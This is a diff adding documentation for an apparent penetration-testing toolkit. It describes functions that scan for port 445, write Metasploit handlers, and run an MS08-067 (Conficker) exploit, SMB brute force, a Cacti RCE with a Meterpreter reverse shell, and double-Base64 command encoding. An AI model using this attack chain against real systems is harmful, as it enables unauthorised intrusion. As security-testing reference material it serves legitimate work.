+    msfpc verbose loop eth1           # A payload for every type, using eth1's IP.
+    msfpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.
+
+## find_tgts
+Finds and returns a list of target hosts with port 445 open in the specified subnet.
+
+Args:
+    subnet (str): The subnet to scan, e.g., '192.168.1.0/24'.
+
+Returns:
+    list: A list of IP addresses where port 445 is open.
+
+## setup_handler
+Sets up a Metasploit multi/handler configuration in the given config file.
+
+Args:
+    config_file (file-like object): The file object to write the Metasploit handler configuration to.
+    lhost (str): The local host IP address to listen for incoming connections.
+    lport (int): The local port number to listen for incoming connections.
+
+Writes:
+    - Exploit configuration for Metasploit to the provided file.
+
+## conficker_exploit
+Configures and writes a Metasploit exploit for the Conficker vulnerability to the given config file.
+
+Args:
+    config_file (file-like object): The file object to write the Metasploit exploit configuration to.
+    host (str): The target host IP address to exploit.
+    lhost (str): The local host IP address to listen for incoming connections.
+    lport (int): The local port number to listen for incoming connections.
+
+Writes:
+    - Exploit configuration for the Conficker vulnerability (MS08-067) to the provided file.
+
+## smb_brute
+Configures and writes a Metasploit SMB brute force exploit for the given host to the provided config file.
+
+Args:
+    config_file (file-like object): The file object to write the Metasploit exploit configuration to.
+    host (str): The target host IP address to exploit.
+    passwd_file (str): Path to a file containing a list of passwords to use for brute force.
+    lhost (str): The local host IP address to listen for incoming connections.
+    lport (int): The local port number to listen for incoming connections.
+
+Writes:
+    - Exploit configuration for SMB brute force (using the psexec module) to the provided file for each password in the passwd_file.
+
+## setup_handler
+Sets up a Metasploit multi/handler exploit configuration in the provided config file.
+
+Args:
+    config_file (file-like object): The file object to write the Metasploit handler configuration to.
+    lhost (str): The local host IP address to listen for incoming connections.
+    lport (int): The local port number to listen for incoming connections.
+
+Writes:
+    - Configuration commands to the file to set up the Metasploit handler with the specified payload and options.
+    - The payload used is `php/meterpreter/reverse_tcp`.
+    - The handler is configured to listen on the provided LHOST and LPORT.
+    - Starts the exploit with the `-j -z` options.
+
+## cacti_exploit
+Configures an exploit for the Cacti Package Import Remote Code Execution vulnerability in the provided config file.
+
+Args:
+    config_file (file-like object): The file object to write the Metasploit exploit configuration to.
+    host (str): The target host IP address where the Cacti service is running.
+
+Writes:
+    - Configuration commands to the file to set up the Metasploit exploit for the Cacti Package Import RCE.
+    - Sets the RHOST to the target host IP.
+    - Sets the payload options including the LHOST, USERNAME, and PASSWORD.
+    - Starts the exploit with the `-j -z` options.
 
 ## double_base64_encode
 Perform double Base64 encoding on the given command.
